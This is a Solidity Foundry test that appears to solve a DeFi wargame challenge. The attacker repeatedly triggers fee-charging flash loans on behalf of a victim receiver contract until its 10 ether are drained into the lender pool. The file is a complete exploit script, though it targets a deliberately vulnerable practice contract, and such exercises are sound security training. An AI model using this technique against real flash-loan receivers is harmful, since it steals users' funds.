// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Utilities} from "../utils/Utilities.sol" ;
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../src/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../src/NaiveReceiverLenderPool.sol";


contract ContractTest is Test{
    uint256 ETHER_POOL= 1000 ether ;
    uint256 ETHER_RECEIVER= 10 ether ;

    
    address payable  user ;
    address payable attacker ;

    Utilities internal utils ;
    NaiveReceiverLenderPool pool ;
    FlashLoanReceiver receiver ;
    
    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        pool = new NaiveReceiverLenderPool();
        vm.label(
            address(pool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(pool), ETHER_POOL);

        assertEq(address(pool).balance, ETHER_POOL);
        assertEq(pool.fixedFee(), 1e18);

        receiver  = new FlashLoanReceiver(
            payable(pool)
        );
        vm.label(address(receiver), "Flash Loan Receiver");
        vm.deal(address(receiver), ETHER_RECEIVER);

        assertEq(address(receiver).balance, ETHER_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }
     
    function testExploit() public {
        
        vm.startPrank(attacker);
        uint256 flashFee =  pool.fixedFee();
        while(true){
           uint256 flashAmount = address(receiver).balance - flashFee ;

           pool.flashLoan(address(receiver),flashAmount);
            
            if(address(receiver).balance == 0) break ;
        }
        
        vm.stopPrank();

        validation();
    }

    function validation() public {
        
        assertEq(address(receiver).balance, 0);
        assertEq(
            address(pool).balance, 
            ETHER_POOL + ETHER_RECEIVER
        );

    }
    
}


